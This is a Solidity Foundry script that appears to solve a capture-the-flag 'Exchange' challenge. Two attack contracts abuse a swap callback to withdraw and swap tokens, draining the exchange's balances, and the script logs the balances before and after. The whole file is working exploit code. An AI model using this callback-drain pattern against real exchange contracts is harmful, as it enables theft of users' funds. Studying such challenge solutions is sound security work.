
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Exchange.sol";

contract ExchangeSolve is Script {
    Setup public set = Setup(0x4d049491A5C3924075BcFC4BaDF67493b05699b3);
    Exchange public exchange = set.exchange();
    Token public token1 = set.token1();
    Token public token2 = set.token2();
    Token public token3 = set.token3();
    address player = vm.envAddress("PLAYER");

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Player : ", player);
        console.log("Setup : ", address(set));
        console.log("Exchange : ", address(exchange));
        console.log("Token1 : ", address(token1));
        console.log("Token2 : ", address(token2));
        console.log("Token3 : ", address(token3));

        console.log("isSolved() : ", set.isSolved());

        console.log("Exchange balance Token1 : ", token1.balanceOf(address(exchange)));
        console.log("Exchange balance Token2 : ", token2.balanceOf(address(exchange)));
        console.log("Exchange balance Token3 : ", token3.balanceOf(address(exchange)));
        console.log("Player balance Token1 : ", token1.balanceOf(player));
        console.log("Player balance Token2 : ", token2.balanceOf(player));
        console.log("Player balance Token3 : ", token3.balanceOf(player));
        int256 newP = 0 - int256(200000);
        console.log("", newP);

        Attack attack = new Attack(address(set));
        attack.exploit();
        Attack2 attack2 = new Attack2(address(set));
        attack2.exploit();

        console.log("Exchange balance Token1 : ", token1.balanceOf(address(exchange)));
        console.log("Exchange balance Token2 : ", token2.balanceOf(address(exchange)));
        console.log("Exchange balance Token3 : ", token3.balanceOf(address(exchange)));
        console.log("Attacker balance Token1 : ", token1.balanceOf(address(attack)));
        console.log("Attacker balance Token2 : ", token2.balanceOf(address(attack)));
        console.log("Attacker 2 balance Token3 : ", token3.balanceOf(address(attack2)));
        console.log("isSolved() : ", set.isSolved());
    }

}

contract Attack is SwapCallback{
    Setup public set;
    Exchange public exchange;
    Token public token1;
    Token public token2;
    Token public token3;
    constructor(address _setup) {
        set = Setup(_setup);
        exchange = set.exchange();
        token1 = set.token1();
        token2 = set.token2();
        token3 = set.token3();
    }
    function exploit() public {
        exchange.swap();
    }
    function doSwap() public {

        exchange.withdraw(address(token1), 200000);
        exchange.swapTokens(address(token1), address(token2), 200000, 0);

        exchange.withdraw(address(token2), 200000);
        exchange.swapTokens(address(token2), address(token3), 200000, 0);

    }
}

contract Attack2 is SwapCallback{
    Setup public set;
    Exchange public exchange;
    Token public token1;
    Token public token2;
    Token public token3;
    constructor(address _setup) {
        set = Setup(_setup);
        exchange = set.exchange();
        token1 = set.token1();
        token2 = set.token2();
        token3 = set.token3();
    }
    function exploit() public {
        exchange.swap();
    }
    function doSwap() public {
        exchange.withdraw(address(token3), 400000);
        exchange.swapTokens(address(token3), address(token1), 400000, 0);
    }
}